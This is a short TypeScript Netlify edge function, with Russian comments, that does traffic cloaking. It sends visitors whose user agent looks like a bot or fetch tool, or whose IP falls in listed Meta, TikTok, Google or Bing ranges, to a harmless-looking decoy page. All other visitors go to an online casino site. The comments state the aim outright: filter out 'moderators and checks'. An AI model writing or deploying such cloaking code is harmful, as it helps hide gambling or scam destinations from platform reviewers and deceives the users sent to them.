import type { Context } from "https://edge.netlify.com";

// Список User-Agent'ов для ботов, модераторов и проверок
const BOT_UA_REGEX =
  /bot|crawl|spider|facebookexternalhit|facebot|slurp|mediapartners|adsbot|bingpreview|twitterbot|linkedinbot|embedly|quora|pinterest|crawler|python-requests|axios|wget|fetch|telegrambot|vkshare|whatsapp|skypeuripreview|discordbot|applebot|snapchat|google|yahoo|baidu|yandex|duckduckbot/i;

// Диапазоны IP, часто используемые Meta/Facebook/TikTok/Google для проверки
const BLOCKED_IP_RANGES = [
  /^31\.13\./,     // Facebook/Meta
  /^157\.240\./,   // Facebook/Meta
  /^185\.60\./,    // Facebook/Meta
  /^66\.220\./,    // Facebook/Meta
  /^69\.63\./,     // Facebook/Meta
  /^173\.252\./,   // Facebook/Meta
  /^204\.15\.20\./,// TikTok
  /^23\.235\./,    // Google cache
  /^66\.249\./,    // Googlebot
  /^157\.55\./,    // Bing
];

export default async (request: Request, context: Context) => {
  const host = request.headers.get("host") || "";
  const userAgent = request.headers.get("user-agent") || "";
  const ip = context.ip || "";

  // Если мы уже на основном домене — пропускаем
  if (host.endsWith("galaxy-casino.live")) {
    return context.next();
  }

  // Проверка на IP из списка блокировки
  if (BLOCKED_IP_RANGES.some((regex) => regex.test(ip))) {
    return Response.redirect("https://yalanyokgaming.netlify.app/", 302);
  }

  // Проверка по User-Agent
  if (!userAgent || BOT_UA_REGEX.test(userAgent)) {
    return Response.redirect("https://yalanyokgaming.netlify.app/", 302);
  }

  // Все остальные (реальные люди) идут на основной сайт
  return Response.redirect("https://galaxy-casino.live", 302);
};
